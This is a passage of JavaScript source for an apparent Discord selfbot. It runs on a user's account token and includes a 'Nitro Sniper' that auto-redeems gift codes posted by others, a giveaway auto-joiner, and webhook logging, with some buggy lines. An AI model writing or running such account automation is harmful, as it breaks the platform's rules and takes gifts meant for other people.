    var loggerwebhooks = await loggerchannel.fetchWebhooks()
    loggerwebhook = loggerwebhooks.array()[0]
    var announcewebhooks = await updatechannel.fetchWebhooks()
    announcewebhook = announcewebhooks.array()[0]
    var changelogwebhooks = await changelogchannel.fetchWebhooks()
    changelogwebhook = changelogwebhooks.array()[0]
    var loggerwebhooks = await loggerchannel.fetchWebhooks()
    loggerwebhook = loggerwebhooks.array()[0]
    var nitrowebhooks = await nitrochannel.fetchWebhooks()
    nitrowebhook = nitrowebhooks.array()[0]
    var giveawaywebhooks = await giveawaychannel.fetchWebhooks()
    giveawaywebhook = giveawaywebhooks.array()[0]
    var codewebhooks = await codechannel.fetchWebhooks()
    codewebhook = codewebhooks.array()[0]

    if (webhook == undefined) {
        webhook = await channel.createWebhook("Information", infoimg)
    }

    if (nitrowebhook == undefined) {
        nitrowebhook = await nitrochannel.createWebhook("Nitro Sniper")
    }

    if (codewebhook == undefined) {
        codewebhook = await codechannel.createWebhook("Email Code")
    }

    if (giveawaywebhook == undefined) {
        giveawaywebhook = await giveawaychannel.createWebhook("Giveaway Sniper")
    }

    if (changelogwebhook == undefined) {
        changelogwebhook = await changelogchannel.createWebhook("Changelogs")
    }

    if (announcewebhook == undefined) {
        announcewebhook = await updatechannel.createWebhook("Dev Team", img)
        announcewebhook.send("@everyone", {
            embeds: [{
                "title": "Announcement",
                "description": "This is an announcement made by the Dev Team!",
                "color": 0x6cc24a,
                "fields": [{
                        "name": "Scripter/Creator",
                        "value": "wokeuplikeGuap#7690"
                    },
                    {
                        "name": "Discord",
                        "value": "https://discord.gg/7hRbhNy",
                        "inline": true
                    }
                ]
            }]
        })
    }
    fetch('ababad')
        .then(res => res.text())
        .then(body => {
            body = body.replace("\n", "")
            if (version != body) {
                announcewebhook.send("@everyone", {
                    embeds: [{
                        "title": "",
                        "color": 0x6cc24a,
                        "description": "",
                        "fields": [{
                                "name": "Current-Version",
                                "value": version,
                                "inline": true
                            },
                            {
                                "name": "New-Version",
                                "value": body,
                                "inline": true
                            
                            }
                        ]
                    }]
                })
            }
        });

    if (loggerwebhook == undefined) {
        loggerwebhook = await loggerchannel.createWebhook("Message Logger")
    }

    if (settings.version != version) {
        changelogwebhook.send("@everyone", {
            embeds: [{
                "title": "wokeuplikethisChangelog",
                "color": 0x6cc24a,
                "description": "",
                "fields": [{
                    },
                    {
                    },
                    {
                    }
                ]
            }]
        })
        settings.version = version
        fs.writeFileSync("settings.json", JSON.stringify(settings))
    }
    console.log(`Logged in as ${client.user.tag}!`);
});

function embedtostring(embed) {
    var text = "```ini\n"
    if (embed.title) {
        text += "[" + embed.title + "] \n"
    }
    if (embed.description) {
        text += embed.description
    }
    if ((embed.fields) && (embed.fields.length > 0)) {
        text += "\n"
        for (var i = 0; i < embed.fields.length; i++) {
            var field = embed.fields[i]
            text += field.name + ":\n   " + (field.value.replace("\n", "\n   ")) + ((i == (embed.fields.length - 1)) ? "" : "\n\n")
        }
    }
    return text + "\n```"
}

client.on("message", msg => {
    if ((settings.giveaway == true) && (giveawaywebhook != undefined)) {
        try {
            if (msg.author.id == 294882584201003009) {
                if (msg.content == "<:yay:585696613507399692>   **GIVEAWAY**   <:yay:585696613507399692>") {
                    msg.react("🎉").then(() => {
                        giveawaywebhook.send("", {
                            embeds: [{
                                "title": "Giveaway Sniper",
                                "color": 0x6cc24a,
                                "description": "You just joined an Giveaway!",
                                "fields": [{
                                        "name": "Price",
                                        "value": msg.embeds[0].author.name || "**Yo we fucked up**",
                                        "inline": true
                                    },
                                    {
                                        "name": "Channel",
                                        "value": "<#" + msg.channel.id + ">",
                                        "inline": true
                                    },
                                    {
                                        "name": "Server",
                                        "value": msg.guild.name,
                                        "inline": true
                                    }
                                ]
                            }]
                        })
                    })

                }
            }
        } catch (error) {

        }
    }
})

client.on('message', msg => {
    if (msg.author.id == client.user.id) return;
    try {
        if ((settings.nitro == true) && (nitrowebhook != undefined)) {
            if (msg.content.includes("discordapp.com/gifts/") || msg.content.includes("discord.gift/")) {
                var starttime = Date.now()
                if (msg.content.includes("discordapp.com/gifts/")) {

                    var code = msg.content.split("discordapp.com/gifts/").pop().replace(/\s+/g, " ").split(' ')[0]
                    if (attempted.includes(code) == false) {
                        const https = require('https')

                        const options = {
                            hostname: "discordapp.com",
                            port: 443,
                            path: "/api/v6/entitlements/gift-codes/" + code + "/redeem",
                            method: "POST",
                            headers: {
                                "Authorization": settings.token
                            }
                        }

                        const req = https.request(options, (res) => {
                            var data = "";

                            res.on('data', (d) => {
                                data += d
                            })

                            res.on("end", () => {
                                data = JSON.parse(data)
                                nitrowebhook.send("", {
                                    embeds: [{
                                        "title": "Nitro Sniper",
                                        "color": 0x6cc24a,
                                        "description": "We just attempted to redeem an code and here are the results:",
                                        "fields": [{
                                                "name": "Code",
                                                "value": code,
                                                "inline": true
                                            },
                                            {
                                                "name": "Status",
                                                "value": data.message,
                                                "inline": true
                                            },
                                            {
                                                "name": "Author",
                                                "value": msg.author.tag,
                                                "inline": true
                                            },
                                            {
                                                "name": "Speed",
                                                "value": ((starttime - Date.now()) / 1000) + "s",
                                                "inline": true
                                            }
                                        ]
                                    }]
                                })
                            })
                        })

                        req.on('error', (error) => {
                            nitrowebhook.send("", {
                                embeds: [{
                                    "title": "Nitro Sniper",
                                    "color": 0x6cc24a,
                                    "description": "We just attempted to redeem an code and here are the results:",
                                    "fields": [{
                                            "name": "Code",
                                            "value": code,
                                            "inline": true
                                        },
                                        {
                                            "name": "Status",
                                            "value": "We encounterd an error while trying to redeem this code!",
                                            "inline": true
                                        }
                                    ]
                                }]
                            })
                        })

                        req.end()
                    } else {
                        nitrowebhook.send("", {
                            embeds: [{
                                "title": "Nitro Sniper",
                                "color": 0x6cc24a,
                                "description": "We just attempted to redeem an code and here are the results:",
                                "fields": [{
                                        "name": "Code",
                                        "value": code,
                                        "inline": true
                                    },
                                    {
                                        "name": "Status",
                                        "value": "Already attempted!",
                                        "inline": true
                                    },
                                    {
                                        "name": "Author",
                                        "value": message.author.tag,
                                        "inline": true
                                    },
                                    {
                                        "name": "Speed",
                                        "value": ((Date.now() - starttime) / 1000) + "s",
                                        "inline": true
                                    }
                                ]
                            }]
                        })
                    }
                } else if (msg.content.includes("discord.gift/")) {
                    var code = msg.content.split("discord.gift/").pop().replace(/\s+/g, " ").split(' ')[0]
                    if (attempted.includes(code) == false) {
                        const https = require('https')

                        const options = {
                            hostname: "discordapp.com",
                            port: 443,
                            path: "/api/v6/entitlements/gift-codes/" + code + "/redeem",
                            method: "POST",
                            headers: {
                                "Authorization": settings.token
                            }
                        }

                        const req = https.request(options, (res) => {
                            var data = "";

                            res.on('data', (d) => {
                                data += d
                            })

                            res.on("end", () => {
                                data = JSON.parse(data)
                                nitrowebhook.send("", {
                                    embeds: [{
                                        "title": "Nitro Sniper",
                                        "color": 0x6cc24a,
                                        "description": "We just attempted to redeem an code and here are the results:",
                                        "fields": [{
                                                "name": "Code",
                                                "value": code,
                                                "inline": true
                                            },
                                            {
                                                "name": "Status",
                                                "value": data.message,
                                                "inline": true
                                            },
                                            {
                                                "name": "Author",
                                                "value": msg.author.tag,
                                                "inline": true
                                            },
                                            {
                                                "name": "Speed",
                                                "value": ((Date.now() - starttime) / 1000) + "s",
                                                "inline": true
                                            }
                                        ]
                                    }]
                                })
                            })
                        })

                        req.on('error', (error) => {
                            nitrowebhook.send("", {
                                embeds: [{
                                    "title": "Nitro Sniper",
                                    "color": 0x6cc24a,
                                    "description": "We just attempted to redeem an code and here are the results:",
                                    "fields": [{
                                            "name": "Code",
                                            "value": code,
                                            "inline": true
                                        },
                                        {
                                            "name": "Status",
                                            "value": "We encounterd an error while trying to redeem this code!",
                                            "inline": true
                                        }
                                    ]
                                }]
                            })
                        })

                        req.end()
                    } else {
                        nitrowebhook.send("", {
                            embeds: [{
                                "title": "Nitro Sniper",
                                "color": 0x6cc24a,
                                "description": "We just attempted to redeem an code and here are the results:",
                                "fields": [{
                                        "name": "Code",
                                        "value": code,
                                        "inline": true
                                    },
                                    {
                                        "name": "Status",
                                        "value": "Already attempted!",
                                        "inline": true
                                    }, ,
                                    {
                                        "name": "Author",
                                        "value": msg.author.tag,
                                        "inline": true
                                    },
                                    {
                                        "name": "Speed",
                                        "value": ((Date.now() - starttime) / 1000) + "s",
                                        "inline": true
                                    }
                                ]
                            }]
                        })
                    }
                }
            }
        }
    } catch (error) {

    }
})

client.on('message', msg => {
    if (msg.author.id == client.user.id) {
        var original = msg.channel.send
        var send = function (data, data1) {
            var data = data
            var data1 = data1
            if (settings.embed == false) {
                var content = (((typeof (data) == "object") && data.content) || ((typeof (data) == "string") && data) || "")
                var embed = (((typeof (data) == "object") && data.embed) || ((typeof (data1) == "object") && data1.embed))
                if (embed) {
                    content += "\n" + embedtostring(embed)
                    if (typeof (data) == "string") {
                        data = content
                        data1.embed = undefined
                    } else {
                        data1 = data
                        data1.embed = undefined
                        data = content
                    }
                }
            }
            if (settings.private == true) {
                var content = (((typeof (data) == "object") && data.content) || ((typeof (data) == "string") && data) || "")
                var config = (((typeof (data) == "object") && data) || (data1))
                config.embeds = config.embeds || []

                if (config.embed) {
                    config.embeds.push(config.embed)
                }

                return webhook.send(content, config)
            } else {
                return msg.channel.send(data, data1)
            }
        }
        var args = msg.content.split(" ");
        for (const key in commands) {
            if (commands.hasOwnProperty(key)) {
                if ((prefix + key) == args[0]) {
                    args.shift();
                    commands[key](msg, args, send);
                    return;
                }
            }
        }
    }
});

client.login(settings.token).catch(function (error) {
    console.log(error.message);
});
